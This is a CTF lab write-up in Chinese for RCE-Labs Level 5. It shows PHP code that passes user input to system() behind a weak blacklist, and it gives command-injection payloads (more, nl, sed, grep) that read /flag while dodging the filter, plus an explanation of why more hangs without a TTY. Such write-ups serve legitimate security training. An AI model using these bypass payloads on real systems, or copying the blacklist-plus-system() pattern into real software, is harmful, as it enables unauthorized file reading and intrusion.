  • 题目名称：RCE-Labs Level 5 (more 命令分页查看)
  • 靶场链接：http://靶机IP:8080/less-5/
  • 涉及工具：浏览器

二、解题步骤

1. 分析题目考什么

本题黑名单再次升级，封禁了 cat|tac|head|tail。题目提示使用 more 命令。考察的是在常用读取工具被禁的情况下，如何寻找替代工具。

2. 怎么解（详细步骤与输出解析）

源码核心逻辑

$pattern = '/cat|tac|head|tail/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}

最终成功 Payload

使用 more 命令分页读取：

?cmd=more /flag

备选方案（如果 more 卡住无回显）：

?cmd=nl /flag
?cmd=sed -n '1,10p' /flag
?cmd=grep . /flag

踩坑记录：非交互式终端的卡死

情况：如果在真实终端中执行 more /flag，它会分页显示，你需要按空格键翻页，按 q 退出。但在 Web 靶场的 PHP system() 环境中，缺乏交互式终端（TTY），命令可能会挂起或只输出第一页。

改进：遇到卡死，立刻换用非交互式的替代命令，如 nl、sed 或 awk。

三、名词大全与原理深度复盘

1. more 命令具体介绍

more 是 Linux 中最早的文件分页查看器之一（诞生于 1978 年 Unix V7）。它的名字来源于“显示更多”（show more），旨在解决 cat 一次性把长文件全部倾泻到屏幕上的问题。

  • 基础语法：more [选项] 文件名
  • 交互操作（在终端中）：
    • 空格键 / f：向下翻一页。
    • 回车键：向下滚动一行。
    • b：向上翻一页（注意：某些早期版本的 more 不支持向上翻页，这是它不如 less 的地方）。
    • /字符串：向下搜索字符串。
    • q：退出 more。
  • 常用参数：
    • -n：指定每屏显示的行数，如 more -10 /flag。
    • +n：从第 n 行开始显示，如 more +50 /flag。
    • -s：将连续的多个空行压缩为一行。

2. more 与 less 的区别

Linux 社区有一句名言："less is more"。less 是在 more 之后开发的，功能更强大（支持上下左右翻页、支持高亮搜索），但 more 依然被保留在绝大多数系统中，因为它的二进制体积更小，启动更快。

3. 底层原理解析

more 的核心逻辑是：读取文件内容 -> 按屏幕行数输出 -> 暂停并等待用户输入 -> 收到翻页指令后继续读取下一页。它依赖于标准输入（stdin）来接收按键。

为什么在 Web RCE 中容易卡死？因为当 PHP 通过 system() 执行 more 时，标准输出被重定向到了 HTTP 响应中，但标准输入并没有连接到一个真实的键盘（没有 TTY）。more 输出完第一页后，傻傻地等待按键，而永远等不到，导致进程挂起，Web 页面一直转圈。

四、题目思考

1. 这跟前面关卡的区别

Level 1-4 考的是“单命令替换”。Level 5 引入了“交互式命令在非交互环境中的坑”。这提醒我们：在 RCE 中，不仅要知道命令功能，还要知道它在 Web 环境下的运行特性。

2. 如何抽象理解概念（大白话）

把读取文件比作吃自助餐。cat 是把所有菜都堆在你面前的盘子里（可能溢出）；tail 是只给你上最后几道菜；而 more 是每次只端上来一盘，你吃完（按空格）它再端下一盘。在 Web 靶场里，你没有手（没有 TTY），端上来第一盘后你没法按空格，服务员（服务器）就只能端着盘子一直站在你旁边等，造成了“卡死”。
